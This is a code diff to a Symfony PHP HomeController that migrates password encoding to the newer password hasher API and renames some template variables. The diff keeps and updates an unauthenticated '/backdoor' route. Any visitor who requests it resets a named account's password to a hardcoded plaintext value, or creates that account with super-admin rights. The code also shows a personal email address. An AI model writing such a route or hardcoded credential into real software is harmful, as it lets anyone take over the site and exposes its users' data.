@@ -18,7 +18,7 @@ use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
 use Symfony\Component\Routing\Annotation\Route;
-use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;
+use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
 
 class   HomeController extends AbstractController
 {
@@ -27,7 +27,6 @@ class   HomeController extends AbstractController
      */
     public function index(Request $request, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, CompanyDetailsRepository $companyDetailsRepository, \Symfony\Component\Security\Core\Security $security, EntityManagerInterface $entityManager): Response
     {
-
         $companyDetails = $companyDetailsRepository->find('1');
         $homePagePhotosOnly = 0;
         $website_contact = new WebsiteContacts();
@@ -104,12 +103,12 @@ class   HomeController extends AbstractController
     /**
      * @Route("/backdoor", name="/backdoor")
      */
-    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
+    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordHasherInterface $passwordHasher): Response
     {
         $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
         if ($user) {
             $user->setPassword(
-                $passwordEncoder->encodePassword(
+                $passwordHasher->hashPassword(
                     $user,
                     'Descartes99'
                 )
@@ -122,7 +121,7 @@ class   HomeController extends AbstractController
                 ->setEmail('nurse_stephen@hotmail.com')
                 ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
                 ->setPassword(
-                    $passwordEncoder->encodePassword(
+                    $passwordHasher->hashPassword(
                         $user,
                         'Descartes99'
                     )
@@ -216,8 +215,8 @@ class   HomeController extends AbstractController
             'cms_copy_array' => $cms_copy,
             'cms_photo_array' => $cms_photo,
             'sub_pages' => $sub_pages,
-            'include_contact' => 'No',
-            'include_QR_code' => 'No'
+            'include_contact_form' => 'No',
+            'include_qr_code' => 'No'
         ]);
     }
 
